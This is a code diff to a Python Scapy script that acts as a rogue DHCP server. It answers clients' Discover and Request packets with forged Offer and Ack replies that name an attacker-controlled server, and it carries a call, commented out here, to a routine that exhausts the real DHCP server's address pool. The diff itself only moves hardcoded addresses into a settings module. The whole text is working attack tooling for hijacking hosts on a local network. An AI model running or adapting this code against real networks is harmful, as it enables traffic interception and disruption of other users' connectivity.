@@ -7,9 +7,9 @@ import ipaddress
 import settings
 
 # EXHAUST IP POOL OF REAL DHCP
-dhcp_exhaust.exhaust()
+#dhcp_exhaust.exhaust()
 
-ip = ipaddress.ip_address('10.10.1.5')
+ip = ipaddress.ip_address(settings.start_ip)
 database = []
 
 def process(p):
@@ -22,7 +22,7 @@ def process(p):
             ip += 1
             print("Discover received")
             dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
-                        / IP(src='10.10.1.1', dst='255.255.255.255') \
+                        / IP(src=settings.source_ip, dst='255.255.255.255') \
                         / UDP(sport=68, dport=67) \
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'offer'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
@@ -32,7 +32,7 @@ def process(p):
         elif p["DHCP"].options[0][1] == 3:
             print("Request received")
             dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
-                        / IP(src='10.10.1.1', dst='10.10.1.2') \
+                        / IP(src=settings.source_ip, dst=str(ip)) \
                         / UDP(sport=68, dport=67) \
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'ack'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
